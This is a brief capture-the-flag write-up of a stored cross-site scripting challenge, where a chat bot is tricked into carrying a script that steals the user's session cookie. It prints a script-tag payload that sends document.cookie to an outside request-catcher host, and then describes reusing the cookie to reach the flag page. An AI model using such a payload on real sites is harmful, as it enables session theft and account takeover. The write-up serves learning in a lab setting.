# Summary
For  this challenge we did our toes into XSS (cross site scripting), in this case it is a sotred cross site scripting, meaing we are attempting to embed our request (to marvin in this case) that contains a malicous package which will send a response to a location of our choosing, in this case grabbing the current cookie from the user will allow use to login into the page and access the flag page.


# Payload/Entrypoint
There are a number of ways in order to use XSS on this challenge for this I used a payload online with a malicious image tag
```
$writeup marvin_scoreboard http"<script>var i=new Image;i.src="https://challenge.free.beeceptor.com/%7Bdocument.cookie%7D;</script>
```

This payload sends the cookie to the beeceptor server (server hoster) which I can then access and use the cookie. Once we have the cookie we merely have to use it in our browser and access the flag webpage to grab the flag.